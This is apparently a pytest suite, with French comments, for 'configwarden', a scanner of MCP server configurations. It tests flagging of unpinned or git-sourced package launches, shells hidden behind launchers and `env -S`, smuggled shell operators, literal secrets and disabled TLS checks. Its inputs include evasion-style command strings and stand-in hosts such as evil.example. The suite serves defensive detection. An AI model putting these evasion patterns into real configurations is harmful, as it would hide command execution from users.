"""Tests v0.3.0 (jour 4) : corrections issues de la revue de sécurité et du grand test.

Deux sources, le 8 octobre 2026 :
- l'Auditeur (revue indépendante) : lanceurs de paquets non reconnus (pnpm dlx,
  uv tool run…), `env -S` qui cache la vraie commande, programme entre guillemets ;
- l'Analyste terrain (3 099 exemples de configuration publiés sur npm et PyPI) :
  faux positifs et angles morts mesurés sur de vraies documentations.

Les faux secrets sont assemblés à l'exécution (voir conftest.py).
"""

import json
import time

import pytest

from configwarden.cli import main
from configwarden.redact import url_origin
from configwarden.rules import secrets
from configwarden.scanner import scan
from tests.conftest import fake_secret

SECRET = fake_secret("Zt", 30)


def ids_for(write_mcp, command: str, args: list[str]) -> list[str]:
    return sorted(
        f.rule.id for f in scan(write_mcp({"s": {"command": command, "args": args}})).findings
    )


def findings_for(write_mcp, server: dict) -> list:
    return scan(write_mcp({"s": server})).findings


def ids_for_server(write_mcp, server: dict) -> list[str]:
    return sorted(f.rule.id for f in findings_for(write_mcp, server))


# --- Auditeur n°1 : les autres lanceurs de paquets ------------------------------


@pytest.mark.parametrize(
    ("command", "args", "expected"),
    [
        ("pnpm", ["dlx", "github:evil/srv"], ["CW107"]),
        ("pnpm", ["dlx", "some-server"], ["CW102"]),
        ("pnpm", ["dlx", "some-server@1.2.3"], []),
        ("pnpm", ["--silent", "dlx", "some-server"], ["CW102"]),
        ("yarn", ["dlx", "github:evil/srv"], ["CW107"]),
        ("yarn", ["dlx", "-p", "some-server", "srv"], ["CW102"]),
        ("bun", ["x", "github:evil/srv"], ["CW107"]),
        ("bun", ["x", "some-server@1.2.3"], []),
        ("npm", ["exec", "-y", "--", "github:evil/srv"], ["CW107"]),
        ("npm", ["x", "some-server"], ["CW102"]),
        ("uv", ["tool", "run", "--from", "git+https://github.com/evil/srv", "srv"], ["CW107"]),
        ("uv", ["tool", "run", "some-server"], ["CW102"]),
        ("uv", ["tool", "run", "some-server==1.2.3"], []),
        ("uv", ["run", "--with", "git+https://github.com/evil/srv", "srv"], ["CW107"]),
        ("pipx", ["run", "some-server"], ["CW102"]),
        ("pipx", ["run", "--spec", "git+https://github.com/evil/srv", "srv"], ["CW107"]),
        ("pipx", ["run", "--spec", "some-server==1.2.3", "srv"], []),
        ("cmd", ["/c", "pnpm", "dlx", "github:evil/srv"], ["CW107"]),
    ],
    ids=[
        "pnpm-dlx-git",
        "pnpm-dlx-unpinned",
        "pnpm-dlx-pinned",
        "pnpm-global-option",
        "yarn-dlx-git",
        "yarn-dlx-package-option",
        "bun-x-git",
        "bun-x-pinned",
        "npm-exec-git",
        "npm-x-unpinned",
        "uv-tool-run-git",
        "uv-tool-run-unpinned",
        "uv-tool-run-pinned",
        "uv-run-with-git",
        "pipx-run-unpinned",
        "pipx-run-spec-git",
        "pipx-run-spec-pinned",
        "cmd-pnpm-dlx",
    ],
)
def test_other_package_launchers_are_checked(write_mcp, command, args, expected) -> None:
    assert ids_for(write_mcp, command, args) == expected


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("uv", ["run", "--directory", "/srv/app", "server.py"]),
        ("uv", ["--directory", "/srv/app", "run", "server.py"]),
        # Le paquet ajouté est figé : depuis la v0.4.0, « --with mcp » seul est signalé (CW102).
        ("uv", ["run", "--with", "mcp==1.9.0", "mcp", "run", "server.py"]),
        ("pnpm", ["exec", "my-server"]),
        ("pnpm", ["install"]),
        ("pipx", ["install", "some-server"]),
    ],
    ids=[
        "uv-run-local",
        "uv-global-option",
        "uv-run-with-registry",
        "pnpm-exec",
        "pnpm-other",
        "pipx-other",
    ],
)
def test_local_project_launches_are_fine(write_mcp, command, args) -> None:
    # « uv run » lance un programme du projet : ce n'est pas un paquet du registre.
    assert ids_for(write_mcp, command, args) == []


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("uv", ["run", "bash", "-c", "x"]),
        ("uv", ["run", "--", "python", "-c", "import os"]),
        ("pnpm", ["exec", "bash", "-c", "x"]),
        ("poetry", ["run", "node", "-e", "1"]),
        ("conda", ["run", "-n", "tools", "bash", "-c", "x"]),
        ("npx", ["-c", "echo hi"]),
        ("npm", ["exec", "--call=echo hi"]),
        ("pnpm", ["dlx", "-c", "echo hi | cowsay"]),
    ],
    ids=[
        "uv-run-bash",
        "uv-run-python-c",
        "pnpm-exec-bash",
        "poetry-run-node-e",
        "conda-run-bash",
        "npx-call",
        "npm-exec-call",
        "pnpm-dlx-shell-mode",
    ],
)
def test_shells_behind_launchers_are_flagged(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == ["CW101"]


def test_auditor_proof_of_concept_is_caught(write_mcp) -> None:
    servers = {
        "a": {"command": "pnpm", "args": ["dlx", "github:evil/x"]},
        "b": {"command": "uv", "args": ["run", "--with", "git+https://github.com/evil/y", "s"]},
        "c": {"command": "env", "args": ["-S", "bash -c payload"]},
    }
    assert sorted(f.rule.id for f in scan(write_mcp(servers)).findings) == [
        "CW101",
        "CW107",
        "CW107",
    ]


# --- Auditeur n°2 : env -S (--split-string) -------------------------------------


@pytest.mark.parametrize(
    ("args", "expected"),
    [
        (["-S", "bash -c payload"], ["CW101"]),
        (["--split-string=npx -y github:evil/srv"], ["CW107"]),
        (["--split-string", "npx -y github:evil/srv"], ["CW107"]),
        (["-Sbash -c payload"], ["CW101"]),
        (["-iS", "bash -c payload"], ["CW101"]),
        (["-u", "HOME", "-S", "bash -c payload"], ["CW101"]),
        (["-S", "-i FOO=1 bash -c payload"], ["CW101"]),
        (["-S", "env -S 'bash -c payload'"], ["CW101"]),
        (["-S", "npx -y some-server@1.2.3"], []),
    ],
    ids=[
        "short",
        "long-equals",
        "long-separate",
        "attached",
        "cluster",
        "after-unset",
        "options-inside",
        "nested",
        "harmless",
    ],
)
def test_env_split_string_is_unwrapped(write_mcp, args, expected) -> None:
    assert ids_for(write_mcp, "env", args) == expected


def test_endless_split_strings_do_not_hide_a_shell(write_mcp) -> None:
    # Chaque -S prend le suivant pour texte : au-delà d'une limite, on signale
    # l'empilement lui-même au lieu de suivre la chaîne sans fin.
    start = time.perf_counter()
    assert ids_for(write_mcp, "env", ["-S"] * 50_000 + ["bash", "-c", "x"]) == ["CW101"]
    assert time.perf_counter() - start < 5


# --- Auditeur n°3 : programme entre guillemets ----------------------------------


@pytest.mark.parametrize(
    ("command", "args", "expected"),
    [
        ("cmd", ["/c", '"npx"', "-y", "github:evil/srv"], ["CW107"]),
        ('"npx"', ["-y", "github:evil/srv"], ["CW107"]),
        ('"C:\\Program Files\\nodejs\\npx.cmd"', ["-y", "github:evil/srv"], ["CW107"]),
        ("cmd", ["/c", '"bash"', "-c", "x"], ["CW101"]),
    ],
    ids=["cmd-quoted-npx", "quoted-command", "quoted-path", "cmd-quoted-bash"],
)
def test_quoted_program_names_are_recognised(write_mcp, command, args, expected) -> None:
    assert ids_for(write_mcp, command, args) == expected


# --- Grand test : toute une ligne de commande dans « command » ------------------


@pytest.mark.parametrize(
    ("server", "expected"),
    [
        ({"command": "npx -y github:evil/srv"}, ["CW107"]),
        ({"command": "npx -y some-server"}, ["CW102"]),
        ({"command": "uvx some-server==1.2.3"}, []),
        ({"command": "npx -y", "args": ["some-server"]}, ["CW102"]),
        ({"command": "npx -y some-server@1.2.3 && calc"}, ["CW101"]),
        ({"command": "docker run --privileged img:1"}, ["CW106"]),
        ({"command": '"C:\\Program Files\\nodejs\\npx.cmd" -y github:evil/srv'}, ["CW107"]),
        (
            {"command": "C:\\Program Files\\nodejs\\npx.cmd", "args": ["-y", "github:evil/srv"]},
            ["CW107"],
        ),
        ({"command": "/Applications/My App.app/Contents/MacOS/server"}, []),
        ({"command": "<path-to-npx, run which npx>", "args": ["-y", "pkg@1.2.3"]}, []),
        ({"command": "npx -y mcp-remote@1.0.0 https://x.example/mcp?key=<your-api-key>"}, []),
    ],
    ids=[
        "npx-git",
        "npx-unpinned",
        "uvx-pinned",
        "split-between-command-and-args",
        "shell-operator",
        "docker",
        "quoted-windows-path",
        "windows-path-with-space",
        "mac-path-with-space",
        "placeholder-command",
        "placeholder-in-url",
    ],
)
def test_command_line_written_in_command(write_mcp, server, expected) -> None:
    assert ids_for_server(write_mcp, server) == expected


# --- Grand test : CW107 affiche le VRAI hôte ------------------------------------


def test_git_ref_is_not_shown_as_the_host(write_mcp) -> None:
    server = {
        "command": "uvx",
        "args": ["--from", "git+https://github.com/someone/srv.git@main", "srv"],
    }
    [finding] = findings_for(write_mcp, server)
    assert "'git+https://github.com/…'" in finding.message


def test_crafted_url_cannot_display_a_trusted_host(write_mcp) -> None:
    # Le vrai serveur est evil.example : le message ne doit pas afficher github.com.
    server = {"command": "npx", "args": ["-y", "https://evil.example/x@github.com/pkg.tgz"]}
    [finding] = findings_for(write_mcp, server)
    assert "evil.example" in finding.message
    assert "github.com" not in finding.message


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("git+https://github.com/o/r.git@main", "git+https://github.com/…"),
        ("https://evil.example/x@github.com/p.tgz", "https://evil.example/…"),
        ("https://user:pass@registry.example/p.tgz", "https://registry.example/…"),
        ("https://user:p@ss@registry.example:8443/p", "https://registry.example:8443/…"),
        ("postgres://app:pw@localhost:5432/db", "postgres://localhost:5432/…"),
        ("https://[::1]:8080/x@y", "https://[::1]:8080/…"),
        ("https://10.0.0.5/x@y", "https://10.0.0.5/…"),
        ("https://github.com\\@evil.example/x", "https://…"),
        ("https://${API_HOST}/mcp", "https://…"),
    ],
    ids=[
        "git-ref",
        "path-at",
        "credentials",
        "at-in-password",
        "database",
        "ipv6",
        "ipv4",
        "backslash",
        "template",
    ],
)
def test_url_origin(url, expected) -> None:
    assert url_origin(url) == expected


def test_ambiguous_url_never_leaks_a_token_containing_a_slash(write_mcp, capsys) -> None:
    head, tail = fake_secret("Ab", 10), fake_secret("Cd", 20)
    path = write_mcp(
        {"s": {"command": "npx", "args": ["-y", f"https://{head}/{tail}@registry.example/p.tgz"]}}
    )
    main(["scan", str(path)])
    out = capsys.readouterr().out
    assert "CW107" in out
    assert head not in out
    assert tail not in out


# --- Grand test : CW102 ne vise pas un chemin local -----------------------------


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["/absolute/path/to/server"]),
        ("npx", ["-y", "./local-server"]),
        ("npx", ["../tools/server"]),
        ("npx", ["~/tools/server"]),
        ("npx", ["C:\\tools\\server"]),
        ("npx", ["file:../server"]),
        ("uvx", ["--from", "./server", "srv"]),
        ("uvx", ["--from", ".", "srv"]),
    ],
    ids=["absolute", "dot", "parent", "home", "windows", "file-url", "uvx-dot-folder", "uvx-dot"],
)
def test_local_paths_are_not_registry_packages(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == []


# --- Grand test : CW103, ce qui n'est PAS un secret --------------------------------


@pytest.mark.parametrize(
    "env",
    [
        {"GOOGLE_APPLICATION_CREDENTIALS": "/path/to/service-account.json"},
        {"SSH_KEY": "~/.ssh/id_ed25519"},
        {"API_KEY_FILE": "C:\\keys\\api.txt"},
        {"MAX_TOKENS": "4096"},
        {"OAUTH_PORT": "8080"},
        {"AUTH_METHOD": "oauth"},
        {"SNOWFLAKE_AUTHENTICATOR": "externalbrowser"},
        {"OAUTH_ENABLED": "true"},
        {"TOKEN_URL": "https://auth.example.com/oauth/token"},
        {"OAUTH_CLIENT_ID": "1234567890-abc.apps.example.com"},
        {"SOLANA_TOKEN_MINT": "So11111111111111111111111111111111111111112"},
        {"SECRET_NAME": "prod/db/password"},
        {"PASSWORD_MIN_LENGTH": "12"},
        {"maxTokens": "2048"},
    ],
    ids=[
        "credentials-file",
        "key-path",
        "key-file",
        "max-tokens",
        "oauth-port",
        "auth-method",
        "authenticator",
        "boolean",
        "token-url",
        "client-id",
        "public-address",
        "secret-name",
        "password-policy",
        "camel-case",
    ],
)
def test_settings_that_are_not_secrets(write_mcp, env) -> None:
    assert ids_for_server(write_mcp, {"command": "srv", "env": env}) == []


@pytest.mark.parametrize(
    "value",
    [
        "sk-...",
        "ghp_xxxxxxxxxxxxxxxxxxxx",
        "pk_test_…",
        "votre_cle_api",
        "你的API密钥",
        "AKIA" + "IOSFODNN7EXAMPLE",
        "{{API_KEY}}",
        "Bearer <token>",
        "sk-ant-api03-...",
        "your-key-here",
    ],
    ids=[
        "ellipsis",
        "x-filler",
        "unicode-ellipsis",
        "french",
        "chinese",
        "aws-docs-example",
        "mustache",
        "bearer-angle",
        "prefix-ellipsis",
        "here",
    ],
)
def test_more_placeholders_are_not_secrets(write_mcp, value) -> None:
    assert ids_for_server(write_mcp, {"command": "srv", "env": {"API_KEY": value}}) == []


@pytest.mark.parametrize(
    "env",
    [
        {"DB_PASSWORD": "postgres"},
        {"DB_PASSWORD": "123456"},
        {"CLIENT_SECRET": "mysecret"},
        {"API_TOKEN": "my-literal-value-123"},
        {"BROWSER_SESSION": SECRET},
        {"SITE_COOKIES": SECRET},
        {"DB_PWD": SECRET},
    ],
    ids=["word-password", "number-password", "word-secret", "literal", "session", "cookies", "pwd"],
)
def test_real_looking_secrets_are_still_flagged(write_mcp, env) -> None:
    findings = findings_for(write_mcp, {"command": "srv", "env": env})
    assert [f.rule.id for f in findings] == ["CW103"]
    assert SECRET not in findings[0].message


def test_secret_inside_json_encoded_headers(write_mcp) -> None:
    env = {"MCP_HEADERS": json.dumps({"Authorization": f"Bearer {SECRET}"})}
    findings = findings_for(write_mcp, {"command": "srv", "env": env})
    assert [f.rule.id for f in findings] == ["CW103"]
    assert SECRET not in findings[0].message
    assert "Authorization" in findings[0].message


# --- Grand test : secrets passés sur la ligne de commande ou dans une URL ---------


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "srv@1.0.0", "--api-key", SECRET]),
        ("npx", ["-y", "srv@1.0.0", "--api-key=" + SECRET]),
        ("node", ["server.js", "--token", SECRET]),
        ("docker", ["run", "-i", "--rm", "-e", "API_KEY=" + SECRET, "img:1"]),
        ("env", ["API_KEY=" + SECRET, "srv"]),
        (
            "npx",
            [
                "-y",
                "mcp-remote@0.1.0",
                "https://mcp.example.com/sse",
                "--header",
                "Authorization: Bearer " + SECRET,
            ],
        ),
        ("npx", ["-y", "srv@1.0.0", "--password", SECRET]),
    ],
    ids=[
        "option",
        "option-equals",
        "node-option",
        "docker-env",
        "env-assignment",
        "header",
        "password",
    ],
)
def test_secret_on_the_command_line_is_flagged(write_mcp, command, args, capsys) -> None:
    path = write_mcp({"s": {"command": command, "args": args}})
    assert [f.rule.id for f in scan(path).findings] == ["CW103"]
    main(["scan", str(path)])
    assert SECRET not in capsys.readouterr().out


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "srv@1.0.0", "--api-key", "${API_KEY}"]),
        ("npx", ["-y", "srv@1.0.0", "--api-key", "YOUR_API_KEY"]),
        ("npx", ["-y", "srv@1.0.0", "--max-tokens", "1000"]),
        ("npx", ["-y", "srv@1.0.0", "--token-file", "/run/secrets/token"]),
        (
            "npx",
            [
                "-y",
                "mcp-remote@0.1.0",
                "https://mcp.example.com/sse",
                "--header",
                "Authorization:${AUTH_HEADER}",
            ],
        ),
        ("docker", ["run", "-i", "--rm", "-e", "API_KEY", "img:1"]),
        ("npx", ["-y", "srv@1.0.0", "--api-key"]),
        ("npx", ["-y", "srv@1.0.0", "--token", "--verbose"]),
    ],
    ids=[
        "reference",
        "placeholder",
        "max-tokens",
        "token-file",
        "header-reference",
        "docker-env-name",
        "no-value",
        "flag-after",
    ],
)
def test_command_line_without_a_literal_secret_is_fine(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == []


@pytest.mark.parametrize(
    "server",
    [
        {"url": "https://mcp.example.com/sse?api_key=" + SECRET},
        {"url": f"https://bob:{SECRET}@mcp.example.com/sse"},
        {"serverUrl": "https://mcp.example.com/mcp?token=" + SECRET},
        {
            "command": "npx",
            "args": ["-y", "mcp-remote@0.1.0", "https://mcp.example.com/sse?key=" + SECRET],
        },
    ],
    ids=["query", "password", "server-url", "argument"],
)
def test_secret_in_a_url_is_flagged(write_mcp, server, capsys) -> None:
    path = write_mcp({"s": server})
    assert [f.rule.id for f in scan(path).findings] == ["CW103"]
    main(["scan", str(path)])
    assert SECRET not in capsys.readouterr().out


@pytest.mark.parametrize(
    "url",
    [
        "https://mcp.example.com/sse?api_key=${API_KEY}",
        "https://mcp.example.com/sse?page=2",
        "https://mcp.example.com/sse?token=YOUR_TOKEN",
        "https://mcp.example.com/sse?api_key=",
    ],
    ids=["reference", "harmless", "placeholder", "empty"],
)
def test_url_without_a_literal_secret_is_fine(write_mcp, url) -> None:
    assert ids_for_server(write_mcp, {"url": url}) == []


# --- CW110 : vérification TLS désactivée ----------------------------------------


@pytest.mark.parametrize(
    "env",
    [
        {"NODE_TLS_REJECT_UNAUTHORIZED": "0"},
        {"PYTHONHTTPSVERIFY": "0"},
        {"GIT_SSL_NO_VERIFY": "true"},
        {"NPM_CONFIG_STRICT_SSL": "false"},
        {"SSL_VERIFY": "false"},
        {"VERIFY_SSL": "False"},
        {"MCP_INSECURE": "1"},
        {"UV_INSECURE_HOST": "pypi.example"},
    ],
    ids=["node", "python", "git", "npm", "ssl-verify", "verify-ssl", "insecure", "uv-host"],
)
def test_tls_checks_disabled_in_env(write_mcp, env) -> None:
    findings = findings_for(write_mcp, {"command": "srv", "env": env})
    assert [f.rule.id for f in findings] == ["CW110"]
    assert findings[0].severity.value == "high"


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["--strict-ssl=false", "-y", "srv@1.0.0"]),
        ("srv", ["--insecure"]),
        ("uvx", ["--allow-insecure-host", "pypi.example", "srv==1.0.0"]),
        ("kubectl-mcp", ["--insecure-skip-tls-verify"]),
    ],
    ids=["npm-strict-ssl", "insecure", "uv-insecure-host", "skip-tls-verify"],
)
def test_tls_checks_disabled_on_the_command_line(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == ["CW110"]


@pytest.mark.parametrize(
    "env",
    [
        {"NODE_TLS_REJECT_UNAUTHORIZED": "1"},
        {"SSL_VERIFY": "true"},
        {"VERIFY_SSL": "1"},
        {"INSECURE": "false"},
    ],
    ids=["node-on", "ssl-verify-on", "verify-ssl-on", "insecure-off"],
)
def test_tls_checks_kept_are_fine(write_mcp, env) -> None:
    assert ids_for_server(write_mcp, {"command": "srv", "env": env}) == []


def test_cw110_is_listed_with_the_rules(capsys) -> None:
    main(["rules"])
    assert "CW110" in capsys.readouterr().out


# --- CW001 : formats connus mais valeurs d'exemple --------------------------------


def _pem_header() -> str:
    return "-----BEGIN " + "PRIVATE KEY-----"


@pytest.mark.parametrize(
    "text",
    [
        "token: xoxb-your-bot-token",
        _pem_header() + "\n...\n-----END " + "PRIVATE KEY-----",
        '"key": "' + _pem_header() + '\\n...\\n"',
        "AKIA" + "IOSFODNN7EXAMPLE",
        "sk-ant-" + "x" * 30,
    ],
    ids=["slack-words", "pem-ellipsis", "pem-json-ellipsis", "aws-docs-example", "x-filler"],
)
def test_documentation_values_are_not_secrets(text) -> None:
    assert secrets.check_text(text, "README.md") == []


@pytest.mark.parametrize(
    ("label", "text"),
    [
        # Assemblé par des appels de fonction : Python ne le colle pas dans le .pyc.
        ("Slack token", "-".join(["xoxb", "123456789012", "1234567890123", fake_secret("", 24)])),
        ("Private key", _pem_header() + "\n" + "MIIEv" + "A" * 60 + "\n"),
        ("Private key", '"key": "' + _pem_header() + "\\n" + "MIIEv" + "B" * 60 + '\\n"'),
        (
            "Private key",
            "-----BEGIN " + "RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\n"
            "DEK-Info: AES-128-CBC,00\n\n" + "MIIEv" + "C" * 60,
        ),
    ],
    ids=["slack-digits", "pem-lines", "pem-json", "pem-encrypted-legacy"],
)
def test_real_shaped_secrets_are_still_found(label, text) -> None:
    assert [f.message.split(" found")[0] for f in secrets.check_text(text, "x")] == [label]


# --- Contre-vérification de l'Auditeur (R1 à R5) ----------------------------------


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("wsl", ["npx", "-y", "pkg@1.0.0", ";", "echo", "ok"]),
        ("wsl.exe", ["-d", "Ubuntu", "srv", "|", "tee", "log"]),
        ("busybox", ["sh", "-c", "echo ok"]),
        ("setsid", ["bash", "-c", "echo ok"]),
        ("su", ["-", "bob", "-c", "echo ok"]),
        ("runuser", ["-u", "bob", "--", "bash", "-c", "echo ok"]),
        ("script", ["-qc", "echo ok", "/dev/null"]),
        ("uv", ["run", "--", "bash", "-c", "echo ok"]),
    ],
    ids=[
        "wsl-semicolon",
        "wsl-pipe",
        "busybox",
        "setsid",
        "su-c",
        "runuser",
        "script-qc",
        "uv-run",
    ],
)
def test_more_shell_entry_points(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == ["CW101"]


def test_wsl_exec_without_shell_is_fine(write_mcp) -> None:
    # « wsl -e » lance le programme sans shell : un « ; » n'y est qu'un argument.
    assert ids_for(write_mcp, "wsl", ["-e", "srv", ";"]) == []


@pytest.mark.parametrize(
    ("command", "args", "expected"),
    [
        ("uv", ["run", "https://h.example/s.py"], ["CW107"]),
        ("deno", ["run", "-A", "https://h.example/s.ts"], ["CW107"]),
        ("deno", ["run", "-A", "npm:some-server"], ["CW102"]),
        ("deno", ["run", "-A", "npm:some-server@1.2.3"], []),
        ("deno", ["run", "--config", "deno.json", "jsr:@scope/srv"], ["CW102"]),
        ("deno", ["run", "-A", "server.ts"], []),
    ],
    ids=["uv-run-url", "deno-url", "deno-npm", "deno-npm-pinned", "deno-jsr", "deno-local"],
)
def test_remote_scripts_are_checked(write_mcp, command, args, expected) -> None:
    assert ids_for(write_mcp, command, args) == expected


@pytest.mark.parametrize(
    ("command", "args", "env"),
    [
        ("srv", ["--keyword", "release-2024"], {}),
        ("srv", ["--primary-key", "user_id2"], {}),
        ("srv", [], {"TOKENIZER_MODEL": "cl100k_base"}),
        ("srv", [], {"KEYCLOAK_REALM": "corp-2024"}),
        ("srv", [], {"AUTH_STRATEGY": "oauth2"}),
        ("srv", [], {"SORT_KEY": "created_at_v2"}),
        ("srv", [], {"CACHE_KEY_PREFIX": "mcp-v2:"}),
    ],
    ids=[
        "keyword",
        "primary-key",
        "tokenizer",
        "keycloak",
        "auth-strategy",
        "sort-key",
        "key-prefix",
    ],
)
def test_settings_with_sensitive_looking_names(write_mcp, command, args, env) -> None:
    assert ids_for_server(write_mcp, {"command": command, "args": args, "env": env}) == []


@pytest.mark.parametrize(
    "server",
    [
        {"command": "srv", "env": {"GITHUB_TOKENS": SECRET}},
        {"command": "srv", "env": {"DB_PASSWORD": "Sécurité-" + SECRET}},
        {"command": "srv", "args": ["--api-key", "-" + SECRET]},
        {"command": "srv", "env": {"MYSQLPASSWORD": SECRET}},
    ],
    ids=["plural", "accented-password", "leading-dash", "glued-word"],
)
def test_real_secrets_not_hidden_by_filters(write_mcp, server) -> None:
    assert ids_for_server(write_mcp, server) == ["CW103"]


@pytest.mark.parametrize(
    "command",
    ["npx -y pkg@1.0.0 $(echo ok)", "npx -y pkg@1.0.0 <`echo ok`>"],
    ids=["dollar-paren", "backtick-in-angles"],
)
def test_hidden_shell_operators_in_command(write_mcp, command) -> None:
    assert ids_for_server(write_mcp, {"command": command}) == ["CW101"]


def test_known_formats_with_x_in_their_body_are_still_found() -> None:
    # Un vrai jeton peut contenir « xXx » ou « -ta- » par hasard : il reste signalé.
    token = fake_secret("ghp_", 36, "aB3dExXxgH7j")
    assert [f.rule.id for f in secrets.check_text(token, "x")] == ["CW001"]
